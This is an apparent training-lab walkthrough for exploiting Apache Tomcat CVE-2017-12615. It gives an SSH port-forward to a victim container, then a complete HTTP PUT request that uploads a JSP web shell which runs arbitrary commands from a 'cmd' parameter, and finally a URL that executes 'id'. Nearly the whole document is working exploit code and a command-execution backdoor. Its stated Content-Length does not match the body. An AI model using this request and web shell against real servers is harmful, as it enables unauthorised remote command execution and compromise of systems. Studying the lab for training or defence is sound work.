# Tomcat Arbitrary Write-file Vulnerability through PUT Method (CVE-2017-12615)

References:
- https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615
- https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp

## Exploit
Forward port 8080 of the victim container to your machine
```
ssh -L 8080:cve-2017-12615:8080 student@10.0.0.12 -p 2222
```

Send the following PUT request to the server
```
PUT /1.jsp/ HTTP/1.1
Host: your-ip:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

<%@ page import="java.util.*,java.io.*" %>
    <HTML>
        <BODY>
            <FORM METHOD="GET" NAME="myform" ACTION="">
                <INPUT TYPE="text" NAME="cmd">
                <INPUT TYPE="submit" VALUE="Send">
            </FORM>
            <pre>
    <%
        if (request.getParameter("cmd") != null) {
                out.println("Command: " + request.getParameter("cmd") + "<BR>");
                Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
                OutputStream os = p.getOutputStream();
                InputStream in = p.getInputStream();
                DataInputStream dis = new DataInputStream(in);
                String disr = dis.readLine();
                while ( disr != null ) {
                        out.println(disr); 
                        disr = dis.readLine(); 
                        }
                }
    %>
            </pre>
        </BODY>
    </HTML>
```

On your browser, access the vulnerable page
```
http://localhost:8080/1.jsp?cmd=id
```